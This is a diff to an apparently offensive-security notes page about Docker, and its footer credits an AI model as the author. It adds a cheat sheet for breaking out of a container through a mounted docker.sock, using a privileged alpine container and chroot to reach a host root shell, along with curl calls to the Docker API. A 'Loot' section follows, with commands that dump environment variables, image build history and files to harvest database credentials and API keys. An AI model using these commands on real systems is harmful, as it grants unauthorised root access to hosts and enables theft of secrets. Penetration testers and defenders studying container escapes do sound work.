@@ -17,7 +17,27 @@ export DOCKER_HOST=tcp://<target>:2375
 docker images
 ```
 
-Sibling orchestration client: [[Tools/Cloud/kubectl|kubectl]].
+### Escape from a container with a mounted `docker.sock`
+
+A very common finding — you're in a container (or the `docker` group) and
+`/var/run/docker.sock` is reachable. Spawn a *new* container that mounts the host root:
+
+```bash
+docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host sh   # → host root
+# No docker client in the container? Drive the API with curl:
+curl --unix-socket /var/run/docker.sock http://localhost/images/json
+```
+
+### Loot Images & Running Containers
+
+```bash
+docker exec -it <container> /bin/sh                                   # shell into a live container
+docker history --no-trunc <image>                                     # build steps — often leak secrets/ARGs
+docker inspect <container> --format '{{json .Config.Env}}'            # env vars (DB creds, API keys)
+docker cp <container>:/path/to/file ./loot                            # pull a file out
+```
+
+Sibling orchestration client: [[Tools/Cloud/kubectl|kubectl]]. Host breakout technique: [[Techniques/Container Escape|Container Escape]].
 
 ---
 
@@ -26,5 +46,5 @@ Sibling orchestration client: [[Tools/Cloud/kubectl|kubectl]].
 ---
 
 *Created: 2026-09-24*
-*Updated: 2026-09-24*
+*Updated: 2026-09-28*
 *Model: claude-opus-4-8*
